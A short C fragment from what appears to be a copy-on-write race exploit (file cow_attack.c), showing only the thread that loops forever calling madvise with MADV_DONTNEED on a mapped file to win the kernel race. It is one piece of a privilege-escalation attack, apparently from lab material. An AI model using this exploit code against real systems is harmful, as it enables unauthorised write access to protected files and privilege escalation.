/* cow_attack.c (the madvise thread) */
void *madviseThread(void *arg) {
 int file_size = (int) arg;

 while(1){
 madvise(map, file_size, MADV_DONTNEED);
 }
}